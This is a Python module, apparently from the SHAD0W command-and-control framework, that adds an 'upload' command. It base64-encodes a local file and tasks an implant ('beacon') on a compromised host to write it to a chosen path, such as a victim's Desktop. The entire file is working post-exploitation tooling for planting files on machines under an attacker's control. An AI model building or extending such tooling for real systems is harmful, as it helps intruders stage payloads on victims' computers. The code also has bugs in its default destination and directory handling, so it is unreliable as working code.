# 
# Upload a file
#

import os
import base64
import argparse

__description__ = "Upload a file to the target"
__author__ = "@_batsec_"

EXEC_ID = 0x3000

ERROR = False
error_list = ""

# file name & data to upload
FILE_TO_UPLOAD = ""
FILE_DATA      = ""

# let argparse error and exit nice
def error(message):
    global ERROR, error_list
    ERROR = True
    error_list += f"\033[31m{message}\033[0m\n"

def exit(status=0, message=None): 
    if message != None: print(message)
    return

def upload_callback(shad0w, data):
    shad0w.debug.log(data, log=True, pre=False)

    return ""

def build_inject_info(args, rcode):

    # create the json object to tell the beacon
    # where to execute the code.

    info = {}

    #info["pid"] = int(args.pid)
    info["dest"] = ' '.join(args.destination)
    info["data"] = rcode

    return "STL dwd "+ info["dest"] + "|" + info["data"]
    #return json.dumps(info)

def get_file_data(filename):

    # get the data from the file

    # so we are in the bridge
    bdir = os.getcwd()
    os.chdir("./.bridge")

    try:
        with open(filename, 'rb') as file:
            data = file.read()
    except FileNotFoundError:
        return None

    # hop back to where we where before
    os.chdir(bdir)

    return base64.b64encode(data).decode()

def main(shad0w, args):
    global FILE_TO_UPLOAD, FILE_DATA

    # used to determine if we are writing to a path or not
    abs_path = "TRUE"

    # save the raw args
    raw_args = args
    
    # check we actually have a beacon
    if shad0w.current_beacon is None:
        shad0w.debug.error("ERROR: No active beacon")
        return
    
    # usage examples
    usage_examples = """

Examples:

upload -f fake_secret_plans.txt -d C:\\Users\\thejoker\\Desktop\\batmans_secret_plans.txt
"""

    # init the parser
    parse = argparse.ArgumentParser(prog='upload',
                                formatter_class=argparse.RawDescriptionHelpFormatter,
                                epilog=usage_examples)
    
    # keep it behaving nice
    parse.exit = exit
    parse.error = error

    # setup the args
    parse.add_argument("-f", "--file", required=True, help="Name of the file you want to upload")
    parse.add_argument("-d", "--destination", nargs="*", help="Destination where the uploaded file should be stored")

    # make sure we dont die from weird args
    try:
        args = parse.parse_args(args[1:])
    except:
        pass
    
    # we need a file to read so if we dont then fail
    if len(args.file) == 0:
        print(error_list) 
        parse.print_help()
        return

    # make the destination file name
    if args.destination == None:
        args.destination = os.path.basename(args.file)
        abs_path = "FALSE"



    # read the data from the file
    rcode = get_file_data(args.file)
    if rcode == None:
        shad0w.debug.error(f"File '{args.file}' does not exist")
        return

    # get the shellcode from the module
    inject_info = build_inject_info(args, rcode)
    # set a task for the current beacon to do
    shad0w.beacons[shad0w.current_beacon]["callback"] = upload_callback
    shad0w.beacons[shad0w.current_beacon]["task"] = inject_info

    return